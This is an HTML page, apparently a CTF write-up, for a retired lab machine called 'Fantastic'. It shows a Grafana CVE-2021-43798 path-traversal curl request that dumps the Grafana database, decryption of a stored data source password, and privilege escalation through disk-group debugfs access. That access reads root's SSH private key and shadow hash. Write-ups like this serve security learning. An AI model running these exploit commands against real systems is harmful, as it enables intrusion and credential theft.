@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Fantastic &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Fantastic</h1>
+    <div class="meta">Target: <code>192.168.229.181</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">Grafana</span><span class="tag">CVE</span><span class="tag">PathTraversal</span><span class="tag">SQLite</span><span class="tag">AESDecrypt</span><span class="tag">SSH</span><span class="tag">diskgroup</span><span class="tag">debugfs</span><span class="tag">infodisclosure</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#nmap">Nmap</a><a class="lvl3" href="#grafana-version-identification">Grafana Version Identification</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#path-traversal-dumping-the-grafana-database">Path Traversal, Dumping the Grafana Database</a><a class="lvl3" href="#decrypting-the-data-source-password">Decrypting the Data Source Password</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#disk-group-debugfs-root">disk Group → debugfs → Root</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Fantastic is a Linux box exposing Prometheus on port 9090 and Grafana on port 3000. Grafana 8.3.0 is vulnerable to CVE-2021-43798, a path traversal that allows unauthenticated download of the Grafana SQLite database. That database contains an AES-encrypted data source password for <code>sysadmin</code>, which a Go decryption script recovers. SSH access as <code>sysadmin</code> reveals membership in the <code>disk</code> group, enabling raw-disk reads via <code>debugfs</code>, used here to steal root's SSH private key and read the proof flag directly off the block device.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE
+22/tcp   open  ssh
+3000/tcp open  http    [Grafana]
+9090/tcp open  http    [Prometheus]
+</code></pre>
+<p>Port 9090 runs Prometheus 2.32.1, useful for metrics enumeration but not directly exploitable here. Port 3000 is the main target.</p>
+<h3 id="grafana-version-identification">Grafana Version Identification</h3>
+<p>The Grafana login page at <code>http://192.168.229.181:3000/login</code> shows:</p>
+<pre><code>Grafana Version v.8.3.0 (914fcedb72)
+</code></pre>
+<p>Default credentials <code>admin:admin</code> do not work. The version identifies the vulnerability:</p>
+<pre><code>Grafana 8.x - Path Traversal (CVE-2021-43798)
+https://www.exploit-db.com/exploits/50581
+</code></pre>
+<h2 id="foothold">Foothold</h2>
+<h3 id="path-traversal-dumping-the-grafana-database">Path Traversal, Dumping the Grafana Database</h3>
+<p>CVE-2021-43798 uses a directory traversal in the plugin API path to read arbitrary files. The automated exploit reads <code>/etc/passwd</code> to confirm:</p>
+<pre><code class="language-sh">python3 50581.py -H http://192.168.229.181:3000
+Read file &gt; /etc/passwd
+</code></pre>
+<p>The <code>/etc/passwd</code> output confirms <code>sysadmin</code> (uid=1001) and <code>prometheus</code> (uid=1000) as real users.</p>
+<p>The more valuable target is the Grafana SQLite database itself, pulled with <code>curl</code>:</p>
+<pre><code class="language-sh">curl --path-as-is http://192.168.229.181:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
+</code></pre>
+<blockquote>
+<p><strong>Why the plugin path enables traversal:</strong> Grafana serves static plugin assets by appending the requested path to a base directory. The fix should canonicalize the path before serving, but versions before 8.3.1 fail to do this, so <code>../../../../</code> escapes the plugin root and reaches anywhere on the filesystem the Grafana process can read.</p>
+</blockquote>
+<h3 id="decrypting-the-data-source-password">Decrypting the Data Source Password</h3>
+<p>Opening <code>grafana.db</code> in a SQLite viewer, the <code>data_source</code> table contains:</p>
+<pre><code>sysadmin
+{&quot;basicAuthPassword&quot;:&quot;anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==&quot;}
+</code></pre>
+<p>The password is AES-encrypted using a key derived from <code>grafana.ini</code>'s <code>secret_key</code>. A Go decryption script recovers it:</p>
+<pre><code class="language-sh">go run AESDecrypt.go
+[*] grafanaIni_secretKey= SW2YcwTIb9zpOOhoPsMm
+[*] DataSourcePassword= anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==
+[*] plainText= ‹redacted›
+</code></pre>
+<p>Credentials:</p>
+<pre><code>sysadmin:‹redacted›
+</code></pre>
+<p>These do not work on the Grafana login panel but succeed over SSH:</p>
+<pre><code class="language-sh">ssh sysadmin@192.168.229.181
+sysadmin@192.168.229.181's password: ‹redacted›
+
+$ whoami
+sysadmin
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="disk-group-debugfs-root">disk Group → debugfs → Root</h3>
+<p><code>id</code> reveals group membership that changes everything:</p>
+<pre><code class="language-sh">$ id
+uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin),6(disk)
+</code></pre>
+<p>LinPEAS confirms: <code>sysadmin</code> is in the <code>disk</code> group (GID 6).</p>
+<blockquote>
+<p><strong>Why <code>disk</code> group membership equals root access:</strong> members of the <code>disk</code> group get read/write access to raw block devices under <code>/dev</code>. The filesystem's permission model lives inside the filesystem. If you can read the raw block device that backs <code>/</code>, you can read any file on it, including <code>/etc/shadow</code>, SSH keys, and flags, regardless of file ownership or permissions. <code>debugfs</code> is a filesystem debugger that opens the block device directly, bypassing all OS-level access controls.</p>
+</blockquote>
+<p>Find the root filesystem device:</p>
+<pre><code class="language-sh">$ df -h
+/dev/sda2   9.8G  5.6G  3.7G  61%  /
+</code></pre>
+<p>Open <code>debugfs</code> against the device and read root's SSH private key:</p>
+<pre><code class="language-sh">debugfs /dev/sda2
+debugfs:  cat root/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAA...
+-----END OPENSSH PRIVATE KEY-----
+</code></pre>
+<p>Read the proof flag without ever becoming root in a shell:</p>
+<pre><code class="language-sh">debugfs:  cat /root/proof.txt
+‹redacted›
+</code></pre>
+<p>The root hash from <code>/etc/shadow</code> was also recoverable this way:</p>
+<pre><code class="language-sh">root:$6$mAe2JsSJSmg1n45O$78rgk3B6HaklRIPcLOtwP9aX5i...
+</code></pre>
+<h2 id="root">Root</h2>
+<p>Root's SSH private key grants full shell access:</p>
+<pre><code class="language-sh">ssh root@192.168.229.181 -i root_id_rsa
+root@fantastic:~# whoami
+root
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>CVE-2021-43798 gives unauthenticated database access.</strong> No login required, just a crafted URL. The Grafana SQLite database contains every data source credential the instance has configured.</li>
+<li><strong>Grafana data source passwords use AES with a per-instance key stored in <code>grafana.ini</code>.</strong> The path traversal leaks both the database and the ini file, making decryption deterministic once both files are obtained.</li>
+<li><strong><code>id</code> is the first command after foothold.</strong> <code>disk</code> group membership (along with <code>lxd</code>, <code>docker</code>, <code>adm</code>) is effectively root because it bypasses the filesystem permission layer entirely.</li>
+<li><strong><code>debugfs</code> reads any file on the partition, including SSH keys and proof flags.</strong> No root shell required, the flag can be read directly from the block device as a <code>disk</code> group member.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
